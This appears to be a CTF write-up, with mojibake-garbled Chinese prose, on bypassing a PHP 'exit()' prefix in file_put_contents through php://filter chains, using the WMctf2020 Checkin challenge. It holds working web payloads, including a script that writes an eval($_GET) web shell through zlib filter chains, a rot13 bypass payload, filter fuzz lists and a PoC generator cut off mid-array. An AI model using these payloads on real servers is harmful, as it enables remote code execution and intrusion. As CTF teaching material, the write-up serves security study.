<p>å°è¯•è„šæœ¬</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = [
    <span class="hljs-string">&#x27;string.toupper&#x27;</span>,
    <span class="hljs-string">&#x27;string.tolower&#x27;</span>,
    <span class="hljs-string">&#x27;string.strip_tags&#x27;</span>,
    <span class="hljs-string">&#x27;convert.base64-encode&#x27;</span>,
    <span class="hljs-string">&#x27;convert.base64-decode&#x27;</span>,
    <span class="hljs-string">&#x27;ASCII&#x27;</span>,
    <span class="hljs-string">&#x27;EUC-JP&#x27;</span>,
    <span class="hljs-string">&#x27;SJIS&#x27;</span>,
    <span class="hljs-string">&#x27;eucJP-win&#x27;</span>,
    <span class="hljs-string">&#x27;SJIS-win&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-2022-JP&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-2022-JP-MS&#x27;</span>,
    <span class="hljs-string">&#x27;CP932&#x27;</span>,
    <span class="hljs-string">&#x27;CP51932&#x27;</span>,
    <span class="hljs-string">&#x27;SJIS-mac&#x27;</span>,
    <span class="hljs-string">&#x27;SJIS-Mobile#DOCOMO&#x27;</span>,
    <span class="hljs-string">&#x27;SJIS-Mobile#KDDI&#x27;</span>,
    <span class="hljs-string">&#x27;SJIS-Mobile#SOFTBANK&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-2022-JP-MOBILE#KDDI&#x27;</span>,
    <span class="hljs-string">&#x27;JIS&#x27;</span>,
    <span class="hljs-string">&#x27;JIS-ms&#x27;</span>,
    <span class="hljs-string">&#x27;CP50220&#x27;</span>,
    <span class="hljs-string">&#x27;CP50220raw&#x27;</span>,
    <span class="hljs-string">&#x27;CP50221&#x27;</span>,
    <span class="hljs-string">&#x27;CP50222&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-1&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-2&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-3&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-4&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-5&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-6&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-7&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-8&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-9&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-10&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-13&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-14&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-15&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-16&#x27;</span>,
    <span class="hljs-string">&#x27;byte2be&#x27;</span>,
    <span class="hljs-string">&#x27;byte2le&#x27;</span>,
    <span class="hljs-string">&#x27;byte4be&#x27;</span>,
    <span class="hljs-string">&#x27;byte4le&#x27;</span>,
    <span class="hljs-string">&#x27;BASE64&#x27;</span>,
    <span class="hljs-string">&#x27;HTML-ENTITIES&#x27;</span>,
    <span class="hljs-string">&#x27;7bit&#x27;</span>,
    <span class="hljs-string">&#x27;8bit&#x27;</span>,
    <span class="hljs-string">&#x27;EUC-CN&#x27;</span>,
    <span class="hljs-string">&#x27;CP936&#x27;</span>,
    <span class="hljs-string">&#x27;GB18030&#x27;</span>,
    <span class="hljs-string">&#x27;HZ&#x27;</span>,
    <span class="hljs-string">&#x27;EUC-TW&#x27;</span>,
    <span class="hljs-string">&#x27;CP950&#x27;</span>,
    <span class="hljs-string">&#x27;BIG-5&#x27;</span>,
    <span class="hljs-string">&#x27;EUC-KR&#x27;</span>,
    <span class="hljs-string">&#x27;UHC&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-2022-KR&#x27;</span>,
    <span class="hljs-string">&#x27;Windows-1251&#x27;</span>,
    <span class="hljs-string">&#x27;Windows-1252&#x27;</span>,
    <span class="hljs-string">&#x27;CP866&#x27;</span>,
    <span class="hljs-string">&#x27;KOI8-R&#x27;</span>,
    <span class="hljs-string">&#x27;KOI8-U&#x27;</span>,
    <span class="hljs-string">&#x27;ArmSCII-8&#x27;</span>,
];
@mkdir(<span class="hljs-string">&#x27;./test&#x27;</span>);
@chdir(<span class="hljs-string">&#x27;./test&#x27;</span>);

<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;
    <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;php://filter/zlib.deflate|&#x27;</span> . <span class="hljs-variable">$item</span> . <span class="hljs-string">&#x27;|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=Cyc1e&#x27;</span>.<span class="hljs-variable">$item</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;
    file_put_contents(<span class="hljs-variable">$content</span>, <span class="hljs-string">&#x27;&lt;?php exit();&#x27;</span> . <span class="hljs-variable">$content</span>);
&#125;
</code></pre></div>



<h2 id="ä¾‹é¢˜ï¼šWMctf2020-Checkin"><a href="#ä¾‹é¢˜ï¼šWMctf2020-Checkin" class="headerlink" title="ä¾‹é¢˜ï¼šWMctf2020 Checkin"></a>ä¾‹é¢˜ï¼šWMctf2020 Checkin</h2><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//PHP 7.0.33 Apache/2.4.25</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&#x27;/var/www/html/&#x27;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_REAL_IP&#x27;</span>]);
@mkdir(<span class="hljs-variable">$sandbox</span>);
@chdir(<span class="hljs-variable">$sandbox</span>);
highlight_file(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;
    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];
    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="hljs-variable">$content</span>))
         <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);
    <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$content</span>))
        <span class="hljs-keyword">require_once</span>(<span class="hljs-variable">$content</span>);
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;
    file_put_contents(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;&lt;?php exit();&#x27;</span>.<span class="hljs-variable">$content</span>);
&#125;</code></pre></div>

<h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><p>åˆ©ç”¨äºŒæ¬¡ç¼–ç ç»•è¿‡</p>
<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">content</span>=php://filter/write=string.%<span class="hljs-number">7</span>%<span class="hljs-number">32</span>ot<span class="hljs-number">13</span>|%<span class="hljs-number">3</span>C?cuc%<span class="hljs-number">20</span>cucvasb();?%<span class="hljs-number">3</span>E/resource=drom.php</code></pre></div>



<h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><p>ä½¿ç”¨phpfuzzè¿‡æ»¤å™¨è„šæœ¬çœ‹çœ‹å“ªäº›è¿‡æ»¤å™¨èƒ½ç”¨</p>
<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">string</span>.toupper
<span class="hljs-attribute">string</span>.tolower
<span class="hljs-attribute">string</span>.strip_tags
<span class="hljs-attribute">zlib</span>.deflate
<span class="hljs-attribute">zlib</span>.inflate
<span class="hljs-attribute">bzip2</span>.compress
<span class="hljs-attribute">bzip2</span>.decompress
<span class="hljs-attribute">ASCII</span>
<span class="hljs-attribute">EUC</span>-JP
<span class="hljs-attribute">SJIS</span>
<span class="hljs-attribute">eucJP</span>-win
<span class="hljs-attribute">SJIS</span>-win
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MS
<span class="hljs-attribute">CP932</span>
<span class="hljs-attribute">CP51932</span>
<span class="hljs-attribute">SJIS</span>-mac
<span class="hljs-attribute">SJIS</span>-Mobile#DOCOMO
<span class="hljs-attribute">SJIS</span>-Mobile#KDDI
<span class="hljs-attribute">SJIS</span>-Mobile#SOFTBANK
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MOBILE#KDDI
<span class="hljs-attribute">JIS</span>
<span class="hljs-attribute">JIS</span>-ms
<span class="hljs-attribute">CP50220</span>
<span class="hljs-attribute">CP50220raw</span>
<span class="hljs-attribute">CP50221</span>
<span class="hljs-attribute">CP50222</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">2</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">3</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">4</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">5</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">6</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">7</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">8</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">9</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">10</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">13</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">14</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">15</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">16</span>
<span class="hljs-attribute">byte2be</span>
<span class="hljs-attribute">byte2le</span>
<span class="hljs-attribute">byte4be</span>
<span class="hljs-attribute">byte4le</span>
<span class="hljs-attribute">HTML</span>-ENTITIES
<span class="hljs-attribute">7bit</span>
<span class="hljs-attribute">8bit</span>
<span class="hljs-attribute">EUC</span>-CN
<span class="hljs-attribute">CP936</span>
<span class="hljs-attribute">GB18030</span>
<span class="hljs-attribute">HZ</span>
<span class="hljs-attribute">EUC</span>-TW
<span class="hljs-attribute">CP950</span>
<span class="hljs-attribute">BIG</span>-<span class="hljs-number">5</span>
<span class="hljs-attribute">EUC</span>-KR
<span class="hljs-attribute">UHC</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-KR
<span class="hljs-attribute">Windows</span>-<span class="hljs-number">1251</span>
<span class="hljs-attribute">Windows</span>-<span class="hljs-number">1252</span>
<span class="hljs-attribute">CP866</span>
<span class="hljs-attribute">KOI8</span>-R
<span class="hljs-attribute">KOI8</span>-U
<span class="hljs-attribute">ArmSCII</span>-<span class="hljs-number">8</span></code></pre></div>



<p>æœ€å¥½ç”¨çš„åº”è¯¥å°±æ˜¯<code>zlib</code>çš„<code>zlib.deflate</code>å’Œ<code>zlib.inflate</code>ï¼Œç»„åˆä½¿ç”¨å‹ç¼©åå†è§£å‹åå†…å®¹è‚¯å®šä¸å˜</p>
<p>è¿™ç§æ–¹æ³•å°±éœ€è¦å°†å‰é¢çš„æ ‡ç­¾é—­åˆï¼Œé—­åˆåå¦‚æœèƒ½å¤Ÿç›´æ¥å¹²æ‰exitæœ€å¥½ï¼Œå¦‚æœä¸è¡Œå°±åªèƒ½ç”¨string.strip_tagsè¿‡æ»¤å™¨å†è¿›è¡Œè¿‡æ»¤</p>
<p>å¯ä»¥åœ¨ä¸­é—´éå†ä¸€ä¸‹å‰©ä¸‹çš„å‡ ä¸ªè¿‡æ»¤å™¨ï¼Œçœ‹çœ‹ä¸­é—´è¿›è¡Œä»€ä¹ˆæ“ä½œä¼šå½±å“åç»­inflateçš„å†…å®¹ï¼Œç®€å•éå†ä¸€ä¸‹å¯ä»¥å‘ç°ä¸­é—´æ’å…¥string.tolowerè½¬åä¼šæŠŠç©ºæ ¼å’Œexitå¤„ç†äº†å°±å¯ä»¥ç»•è¿‡exit</p>
<p>  <img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200906205447664.png" alt="image-20200906205447664"></p>
<p>åˆ«çš„è¿‡æ»¤å™¨å¥½åƒéƒ½æ²¡æœ‰å˜</p>
<h2 id="fuzzè¾…åŠ©è„šæœ¬ç¼–å†™"><a href="#fuzzè¾…åŠ©è„šæœ¬ç¼–å†™" class="headerlink" title="fuzzè¾…åŠ©è„šæœ¬ç¼–å†™"></a>fuzzè¾…åŠ©è„šæœ¬ç¼–å†™</h2><h3 id="è¿‡æ»¤å™¨å­—å…¸ï¼š"><a href="#è¿‡æ»¤å™¨å­—å…¸ï¼š" class="headerlink" title="è¿‡æ»¤å™¨å­—å…¸ï¼š"></a>è¿‡æ»¤å™¨å­—å…¸ï¼š</h3><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">string</span>.rot<span class="hljs-number">13</span>
<span class="hljs-attribute">string</span>.toupper
<span class="hljs-attribute">string</span>.tolower
<span class="hljs-attribute">string</span>.strip_tags 
<span class="hljs-attribute">convert</span>.base<span class="hljs-number">64</span>-encode
<span class="hljs-attribute">convert</span>.base<span class="hljs-number">64</span>-decode
<span class="hljs-attribute">zlib</span>.deflate
<span class="hljs-attribute">zlib</span>.inflate
<span class="hljs-attribute">bzip2</span>.compress
<span class="hljs-attribute">bzip2</span>.decompress
<span class="hljs-attribute">convert</span>.base<span class="hljs-number">64</span>-encode
<span class="hljs-attribute">convert</span>.base<span class="hljs-number">64</span>-decode
<span class="hljs-attribute">convert</span>.quoted-printable-encode
<span class="hljs-attribute">convert</span>.quoted-printable-decode
<span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>
<span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>BE
<span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>LE
<span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>
<span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>BE
<span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>LE
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>BE
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>LE
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>BE
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>LE
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">7</span>
<span class="hljs-attribute">UTF7</span>-IMAP
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>
<span class="hljs-attribute">ASCII</span>
<span class="hljs-attribute">EUC</span>-JP
<span class="hljs-attribute">SJIS</span>
<span class="hljs-attribute">eucJP</span>-win
<span class="hljs-attribute">SJIS</span>-win
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MS
<span class="hljs-attribute">CP932</span>
<span class="hljs-attribute">CP51932</span>
<span class="hljs-attribute">SJIS</span>-mac
<span class="hljs-attribute">SJIS</span>-Mobile#DOCOMO
<span class="hljs-attribute">SJIS</span>-Mobile#KDDI
<span class="hljs-attribute">SJIS</span>-Mobile#SOFTBANK
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#DOCOMO
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-A
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-B
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#SOFTBANK
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MOBILE#KDDI
<span class="hljs-attribute">JIS</span>
<span class="hljs-attribute">JIS</span>-ms
<span class="hljs-attribute">CP50220</span>
<span class="hljs-attribute">CP50220raw</span>
<span class="hljs-attribute">CP50221</span>
<span class="hljs-attribute">CP50222</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">2</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">3</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">4</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">5</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">6</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">7</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">8</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">9</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">10</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">13</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">14</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">15</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">16</span>
<span class="hljs-attribute">byte2be</span>
<span class="hljs-attribute">byte2le</span>
<span class="hljs-attribute">byte4be</span>
<span class="hljs-attribute">byte4le</span>
<span class="hljs-attribute">BASE64</span>
<span class="hljs-attribute">HTML</span>-ENTITIES
<span class="hljs-attribute">7bit</span>
<span class="hljs-attribute">8bit</span>
<span class="hljs-attribute">EUC</span>-CN
<span class="hljs-attribute">CP936</span>
<span class="hljs-attribute">GB18030</span>
<span class="hljs-attribute">HZ</span>
<span class="hljs-attribute">EUC</span>-TW
<span class="hljs-attribute">CP950</span>
<span class="hljs-attribute">BIG</span>-<span class="hljs-number">5</span>
<span class="hljs-attribute">EUC</span>-KR
<span class="hljs-attribute">UHC</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-KR
<span class="hljs-attribute">Windows</span>-<span class="hljs-number">1251</span>
<span class="hljs-attribute">Windows</span>-<span class="hljs-number">1252</span>
<span class="hljs-attribute">CP866</span>
<span class="hljs-attribute">KOI8</span>-R
<span class="hljs-attribute">KOI8</span>-U
<span class="hljs-attribute">ArmSCII</span>-<span class="hljs-number">8</span></code></pre></div>



<h3 id="phpfuzzè¿‡æ»¤å™¨"><a href="#phpfuzzè¿‡æ»¤å™¨" class="headerlink" title="phpfuzzè¿‡æ»¤å™¨"></a>phpfuzzè¿‡æ»¤å™¨</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = [
    <span class="hljs-string">&#x27;string.rot13&#x27;</span>,
    <span class="hljs-string">&#x27;string.toupper&#x27;</span>,
    <span class="hljs-string">&#x27;string.tolower&#x27;</span>,
    <span class="hljs-string">&#x27;string.strip_tags&#x27;</span>,
    <span class="hljs-string">&#x27;convert.base64-encode&#x27;</span>,
    <span class="hljs-string">&#x27;convert.base64-decode&#x27;</span>,
	  <span class="hljs-string">&#x27;convert.quoted-printable-encode&#x27;</span>,
	  <span class="hljs-string">&#x27;convert.quoted-printable-decode&#x27;</span>,
    <span class="hljs-string">&#x27;zlib.deflate&#x27;</span>,
    <span class="hljs-string">&#x27;zlib.inflate&#x27;</span>,
    <span class="hljs-string">&#x27;bzip2.compress&#x27;</span>,
    <span class="hljs-string">&#x27;bzip2.decompress&#x27;</span>,
    <span class="hljs-string">&#x27;UCS-4&#x27;</span>,
    <span class="hljs-string">&#x27;UCS-4BE&#x27;</span>,
    <span class="hljs-string">&#x27;UCS-2&#x27;</span> ,
    <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>,
    <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>,
    <span class="hljs-string">&#x27;UTF-32&#x27;</span>,
    <span class="hljs-string">&#x27;UTF-32BE&#x27;</span>,
    <span class="hljs-string">&#x27;UTF-32LE&#x27;</span>,
    <span class="hljs-string">&#x27;UTF-16&#x27;</span>,
    <span class="hljs-string">&#x27;UTF-16BE&#x27;</span>,
    <span class="hljs-string">&#x27;UTF-16LE&#x27;</span>,
    <span class="hljs-string">&#x27;UTF-7&#x27;</span>,
    <span class="hljs-string">&#x27;UTF7-IMAP&#x27;</span>,
    <span class="hljs-string">&#x27;UTF-8&#x27;</span>,
    <span class="hljs-string">&#x27;ASCII&#x27;</span>,
    <span class="hljs-string">&#x27;EUC-JP&#x27;</span>,
    <span class="hljs-string">&#x27;SJIS&#x27;</span>,
    <span class="hljs-string">&#x27;eucJP-win&#x27;</span>,
    <span class="hljs-string">&#x27;SJIS-win&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-2022-JP&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-2022-JP-MS&#x27;</span>,
    <span class="hljs-string">&#x27;CP932&#x27;</span>,
    <span class="hljs-string">&#x27;CP51932&#x27;</span>,
    <span class="hljs-string">&#x27;SJIS-mac&#x27;</span>,
    <span class="hljs-string">&#x27;SJIS-Mobile#DOCOMO&#x27;</span>,
    <span class="hljs-string">&#x27;SJIS-Mobile#KDDI&#x27;</span>,
    <span class="hljs-string">&#x27;SJIS-Mobile#SOFTBANK&#x27;</span>,
    <span class="hljs-string">&#x27;UTF-8-Mobile#DOCOMO&#x27;</span>,
    <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-A&#x27;</span>,
    <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-B&#x27;</span>,
    <span class="hljs-string">&#x27;UTF-8-Mobile#SOFTBANK&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-2022-JP-MOBILE#KDDI&#x27;</span>,
    <span class="hljs-string">&#x27;JIS&#x27;</span>,
    <span class="hljs-string">&#x27;JIS-ms&#x27;</span>,
    <span class="hljs-string">&#x27;CP50220&#x27;</span>,
    <span class="hljs-string">&#x27;CP50220raw&#x27;</span>,
    <span class="hljs-string">&#x27;CP50221&#x27;</span>,
    <span class="hljs-string">&#x27;CP50222&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-1&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-2&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-3&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-4&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-5&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-6&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-7&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-8&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-9&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-10&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-13&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-14&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-15&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-8859-16&#x27;</span>,
    <span class="hljs-string">&#x27;byte2be&#x27;</span>,
    <span class="hljs-string">&#x27;byte2le&#x27;</span>,
    <span class="hljs-string">&#x27;byte4be&#x27;</span>,
    <span class="hljs-string">&#x27;byte4le&#x27;</span>,
    <span class="hljs-string">&#x27;BASE64&#x27;</span>,
    <span class="hljs-string">&#x27;HTML-ENTITIES&#x27;</span>,
    <span class="hljs-string">&#x27;7bit&#x27;</span>,
    <span class="hljs-string">&#x27;8bit&#x27;</span>,
    <span class="hljs-string">&#x27;EUC-CN&#x27;</span>,
    <span class="hljs-string">&#x27;CP936&#x27;</span>,
    <span class="hljs-string">&#x27;GB18030&#x27;</span>,
    <span class="hljs-string">&#x27;HZ&#x27;</span>,
    <span class="hljs-string">&#x27;EUC-TW&#x27;</span>,
    <span class="hljs-string">&#x27;CP950&#x27;</span>,
    <span class="hljs-string">&#x27;BIG-5&#x27;</span>,
    <span class="hljs-string">&#x27;EUC-KR&#x27;</span>,
    <span class="hljs-string">&#x27;UHC&#x27;</span>,
    <span class="hljs-string">&#x27;ISO-2022-KR&#x27;</span>,
    <span class="hljs-string">&#x27;Windows-1251&#x27;</span>,
    <span class="hljs-string">&#x27;Windows-1252&#x27;</span>,
    <span class="hljs-string">&#x27;CP866&#x27;</span>,
    <span class="hljs-string">&#x27;KOI8-R&#x27;</span>,
    <span class="hljs-string">&#x27;KOI8-U&#x27;</span>,
    <span class="hljs-string">&#x27;ArmSCII-8&#x27;</span>,
];
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;
    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="hljs-variable">$item</span>))
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$item</span>,<span class="hljs-string">&quot;\n&quot;</span>;
&#125;</code></pre></div>



<h3 id="pocç”Ÿæˆè„šæœ¬ï¼š"><a href="#pocç”Ÿæˆè„šæœ¬ï¼š" class="headerlink" title="pocç”Ÿæˆè„šæœ¬ï¼š"></a>pocç”Ÿæˆè„šæœ¬ï¼š</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generate</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$prefix</span> = <span class="hljs-string">&quot;&lt;?php exit();&quot;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc</span> = <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$base</span> = <span class="hljs-string">&quot;php://filter/write=&quot;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span> = <span class="hljs-string">&quot;/resource=drom.php&quot;</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span> = [
        <span class="hljs-string">&#x27;rot13&#x27;</span> =&gt; <span class="hljs-string">&#x27;str_rot13&#x27;</span>,
        <span class="hljs-string">&#x27;toupper&#x27;</span> =&gt; <span class="hljs-string">&#x27;strtoupper&#x27;</span>,
        <span class="hljs-string">&#x27;tolower&#x27;</span> =&gt; <span class="hljs-string">&#x27;strtolower&#x27;</span>,
        <span class="hljs-string">&#x27;strip_tags&#x27;</span> =&gt; <span class="hljs-string">&#x27;strip_tags&#x27;</span>,
    ];

    <span class="hljs-keyword">public</span> <span class="hljs-variable">$zlib</span> = [
        <span class="hljs-string">&#x27;deflate&#x27;</span>,
        <span class="hljs-string">&#x27;inflate&#x27;</span>
    ];

    <span class="hljs-keyword">public</span> <span class="hljs-variable">$bzip2</span> = [
        <span class="hljs-string">&#x27;compress&#x27;</span>,
        <span class="hljs-string">&#x27;decompress&#x27;</span>
    ];

    <span class="hljs-keyword">public</span> <span class="hljs-variable">$convert</span> = [
        <span class="hljs-string">&#x27;UCS-4&#x27;</span>,
        <span class="hljs-string">&#x27;UCS-4BE&#x27;</span>,
        <span class="hljs-string">&#x27;UCS-2&#x27;</span> ,
        <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>,
        <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-32&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-32BE&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-32LE&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-16&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-16BE&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-16LE&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-7&#x27;</span>,
        <span class="hljs-string">&#x27;UTF7-IMAP&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-8&#x27;</span>,
        <span class="hljs-string">&#x27;ASCII&#x27;</span>,
        <span class="hljs-string">&#x27;EUC-JP&#x27;</span>,
        <span class="hljs-string">&#x27;SJIS&#x27;</span>,
        <span class="hljs-string">&#x27;eucJP-win&#x27;</span>,
        <span class="hljs-string">&#x27;SJIS-win&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-2022-JP&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-2022-JP-MS&#x27;</span>,
        <span class="hljs-string">&#x27;CP932&#x27;</span>,
        <span class="hljs-string">&#x27;CP51932&#x27;</span>,
        <span class="hljs-string">&#x27;SJIS-mac&#x27;</span>,
